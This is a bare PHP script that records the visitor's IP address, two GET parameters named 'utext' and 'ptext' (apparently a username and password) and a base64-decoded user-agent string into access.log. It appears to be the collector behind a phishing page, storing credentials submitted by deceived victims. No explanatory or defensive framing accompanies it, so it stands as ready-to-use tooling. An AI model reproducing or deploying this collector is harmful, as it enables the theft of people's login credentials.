<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}
$utext = $_GET['utext'];
$ptext = $_GET['ptext'];
$ua = $_GET['ua'];
$res = "" . $ipaddress . "|" . $utext . "|" . $ptext . "|" . base64_decode($ua) . "";

file_put_contents('access.log', $res);
?>